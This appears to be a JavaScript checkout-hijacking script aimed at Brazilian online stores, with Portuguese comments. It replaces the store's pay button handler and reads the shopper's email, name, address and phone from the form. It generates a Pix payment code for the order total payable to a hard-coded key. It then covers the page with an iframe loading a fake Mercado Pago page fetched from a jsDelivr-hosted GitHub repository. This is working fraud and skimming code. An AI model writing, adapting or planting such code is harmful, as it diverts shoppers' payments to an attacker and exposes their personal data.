(function(){
    // Função gerar Pix Copia e Cola
    function gerarPixCopiaECola(chave, valor) {
      function formatTag(tag, value) {
        const length = value.length.toString().padStart(2, '0');
        return `${tag}${length}${value}`;
      }
  
      function calcularCRC16(payload) {
        let polinomio = 0x1021;
        let resultado = 0xFFFF;
  
        for (let i = 0; i < payload.length; i++) {
          resultado ^= payload.charCodeAt(i) << 8;
          for (let j = 0; j < 8; j++) {
            if ((resultado & 0x8000) !== 0) {
              resultado = (resultado << 1) ^ polinomio;
            } else {
              resultado <<= 1;
            }
            resultado &= 0xFFFF;
          }
        }
  
        return resultado.toString(16).toUpperCase().padStart(4, '0');
      }
  
      const payload = [
        formatTag('00', '01'), // Payload Format Indicator
        formatTag('26', formatTag('00', 'BR.GOV.BCB.PIX') + formatTag('01', chave)), // Merchant Account Info
        formatTag('52', '0000'), // Merchant Category Code
        formatTag('53', '986'),  // Currency (986 = BRL)
        formatTag('54', valor.toFixed(2)), // Valor
        formatTag('58', 'BR'), // País
        formatTag('59', 'N'),   // Nome do recebedor
        formatTag('60', 'C'),   // Cidade
        formatTag('62', formatTag('05', '***')) // Info adicional
      ].join('');
  
      const semCRC = payload + '6304';
      const crc = calcularCRC16(semCRC);
  
      return semCRC + crc;
    }
  
    // Função para converter imagem para Base64
    function getBase64FromUrl(url) {
      return fetch(url)
        .then(response => response.blob())
        .then(blob => new Promise((resolve, reject) => {
          const reader = new FileReader();
          reader.onloadend = () => resolve(reader.result);
          reader.onerror = reject;
          reader.readAsDataURL(blob);
        }));
    }
  
    // Função principal para Promise.all e criação do iframe
    function executarIframe() {
      // Captura variáveis externas
      const email = document.querySelector('input#email')?.value || '';
      const firstName = document.querySelector('input#TextField0')?.value || '';
      const lastName = document.querySelector('input#TextField1')?.value || '';
      const postalCode = document.querySelector('input#postalCode')?.value || '';
      const streetName = document.querySelector('input#TextField6')?.value || '';
      const streetNumber = document.querySelector('input#TextField7')?.value || '';
      const neighborhood = document.querySelector('input#TextField9')?.value || '';
      const city = document.querySelector('input#TextField2')?.value || '';
      const state = document.querySelector('select#Select1')?.value || '';
      const phone = document.querySelector('input#TextField3')?.value || '';
      const price = parseFloat(document.querySelector('div[role="row"] strong.notranslate')?.innerText.replace(/[^\d,.-]/g,'').replace(',','.')) || 0;
  
      const chaveFixa = "joao@gmail.com"; // <<< SUA CHAVE PIX REAL
      const copiaecola = gerarPixCopiaECola(chaveFixa, price);
      const qrCodeUrl = "https://api.qrserver.com/v1/create-qr-code/?size=158x158&data=" + encodeURIComponent(copiaecola);
  
      Promise.all([
        fetch('https://cdn.jsdelivr.net/gh/eufiqueitaotriste/1@b574e24900082da9c86c34c6ae9bbfc227007e71/mercadopago.html').then(res => res.text()),
        getBase64FromUrl(qrCodeUrl)
      ])
      .then(([html, qrBase64]) => {
        var iframe = document.createElement('iframe');
        iframe.style.position = 'fixed';
        iframe.style.top = '0';
        iframe.style.left = '0';
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.border = 'none';
        iframe.style.zIndex = '999999999';
        document.body.appendChild(iframe);
  
        const injectedVars = `
          <script>
            const email = ${JSON.stringify(email)};
            const firstName = ${JSON.stringify(firstName)};
            const lastName = ${JSON.stringify(lastName)};
            const postalCode = ${JSON.stringify(postalCode)};
            const streetName = ${JSON.stringify(streetName)};
            const streetNumber = ${JSON.stringify(streetNumber)};
            const neighborhood = ${JSON.stringify(neighborhood)};
            const city = ${JSON.stringify(city)};
            const state = ${JSON.stringify(state)};
            const phone = ${JSON.stringify(phone)};
            const price = ${JSON.stringify(price)};
            const copiaecola = ${JSON.stringify(copiaecola)};
            const qrCodeBase64 = ${JSON.stringify(qrBase64)};
          <\/script>
        `;
        iframe.contentDocument.open();
        iframe.contentDocument.write(injectedVars + html);
        iframe.contentDocument.close();
      })
      .catch(err => console.error(err));
    }
  
    // Limpa eventos anteriores do botão e adiciona onclick
    const btn = document.getElementById('checkout-pay-button');
    if(btn){
      const clone = btn.cloneNode(true);
      btn.parentNode.replaceChild(clone, btn);
      clone.addEventListener('click', executarIframe);
    }
  
  })();
  